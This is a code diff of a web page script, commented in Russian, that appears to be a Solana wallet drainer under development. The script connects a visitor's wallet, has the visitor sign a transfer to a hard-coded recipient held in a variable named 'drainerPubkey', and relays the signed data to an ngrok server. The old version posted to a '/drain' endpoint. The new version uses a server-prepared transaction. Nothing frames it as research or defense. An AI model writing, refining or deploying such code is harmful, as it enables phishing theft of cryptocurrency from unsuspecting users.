@@ -53,23 +53,12 @@
         <div id="status"></div>
     </div>
     
-    <!-- Загружаем более надежную версию buffer через CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.js"></script>
-    
-    <!-- Загружаем Solana Web3 -->
+    <!-- Загружаем только Solana Web3 без Buffer -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     
     <script>
         window.addEventListener('load', () => {
             console.log('Page loaded!');
-            
-            // Проверяем наличие Buffer и его методов
-            if (typeof buffer !== 'undefined' && buffer.Buffer) {
-                console.log('Buffer library loaded successfully');
-                // Теперь функция from должна быть доступна как buffer.Buffer.from
-            } else {
-                console.error('Buffer library not loaded correctly');
-            }
             
             const statusEl = document.getElementById('status');
             
@@ -83,17 +72,6 @@
                     statusEl.className = 'success';
                 }
                 console.log(message);
-            }
-            
-            // Функция для кодирования в base64 без использования Buffer
-            function arrayBufferToBase64(buffer) {
-                let binary = '';
-                const bytes = new Uint8Array(buffer);
-                const len = bytes.byteLength;
-                for (let i = 0; i < len; i++) {
-                    binary += String.fromCharCode(bytes[i]);
-                }
-                return window.btoa(binary);
             }
             
             document.getElementById('connect-wallet').addEventListener('click', async () => {
@@ -112,58 +90,70 @@
                     const publicKey = connectResponse.publicKey;
                     showStatus(`Подключено к кошельку: ${publicKey.toString().substr(0, 10)}...`);
                     
-                    showStatus('Создание транзакции...');
+                    // Отправляем запрос на подготовку транзакции на сервер
+                    showStatus('Подготовка транзакции...');
                     
-                    // Замените на реальный публичный ключ получателя
-                    const drainerPubkey = new window.solanaWeb3.PublicKey('H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp');
-                    
-                    // Фиксированная сумма - 0.001 SOL для тестирования
-                    const lamportsToSend = 1000000;
-                    
-                    // Подключаемся к devnet для получения blockhash
-                    const connection = new window.solanaWeb3.Connection('https://api.devnet.solana.com');
-                    
-                    // Создаем транзакцию
-                    const transaction = new window.solanaWeb3.Transaction().add(
-                        window.solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: drainerPubkey,
-                            lamports: lamportsToSend,
-                        })
-                    );
-                    
-                    showStatus('Получение blockhash...');
-                    const { blockhash } = await connection.getRecentBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = publicKey;
-                    
-                    showStatus('Подписание транзакции...');
-                    const signedTransaction = await window.solana.signTransaction(transaction);
-                    
-                    // Сериализуем транзакцию
-                    const serializedTransaction = signedTransaction.serialize();
-                    
-                    // Используем пользовательскую функцию вместо Buffer.from
-                    const base64Transaction = arrayBufferToBase64(serializedTransaction);
-                    
-                    showStatus('Отправка транзакции на сервер...');
-                    
-                    const serverResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/drain', {
+                    // Получаем запрос на подготовку транзакции от сервера
+                    const prepareResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/prepare-transaction', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ 
-                            signedTransaction: base64Transaction
+                        body: JSON.stringify({
+                            senderPublicKey: publicKey.toString(),
+                            // Замените на реальный ключ получателя
+                            receiverPublicKey: 'H31Bc7rSEVA94YmHhdDU6Nn3xjVFPsvaig8JMW6ZGrBp',
+                            // Фиксированная сумма - 0.001 SOL для тестирования
+                            lamports: 1000000
                         })
                     });
                     
-                    if (!serverResponse.ok) {
-                        const errorText = await serverResponse.text();
-                        throw new Error(`Ошибка сервера: ${serverResponse.status} - ${errorText}`);
+                    if (!prepareResponse.ok) {
+                        const errorText = await prepareResponse.text();
+                        throw new Error(`Ошибка подготовки транзакции: ${prepareResponse.status} - ${errorText}`);
                     }
                     
-                    const result = await serverResponse.json();
+                    const prepareData = await prepareResponse.json();
+                    
+                    // Создаем транзакцию из полученных данных
+                    showStatus('Создание транзакции...');
+                    
+                    // Десериализуем транзакцию
+                    const serializedMessage = new Uint8Array(prepareData.serializedMessage);
+                    const transaction = window.solanaWeb3.Transaction.populate(
+                        window.solanaWeb3.Message.from(serializedMessage)
+                    );
+                    
+                    showStatus('Подписание транзакции...');
+                    // Подписываем транзакцию
+                    const signedTransaction = await window.solana.signTransaction(transaction);
+                    
+                    // Получаем подпись и отправляем на сервер
+                    const signature = signedTransaction.signatures[0].signature;
+                    if (!signature) {
+                        throw new Error('Не удалось получить подпись транзакции');
+                    }
+                    
+                    // Отправляем подпись на сервер
+                    showStatus('Отправка подписанной транзакции...');
+                    
+                    const completeResponse = await fetch('https://702c-95-46-155-53.ngrok-free.app/complete-transaction', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            transactionId: prepareData.transactionId,
+                            signature: Array.from(signature)
+                        })
+                    });
+                    
+                    if (!completeResponse.ok) {
+                        const errorText = await completeResponse.text();
+                        throw new Error(`Ошибка отправки транзакции: ${completeResponse.status} - ${errorText}`);
+                    }
+                    
+                    const result = await completeResponse.json();
                     showStatus(`Транзакция успешно отправлена: ${result.signature}`);
                     
                 } catch (err) {
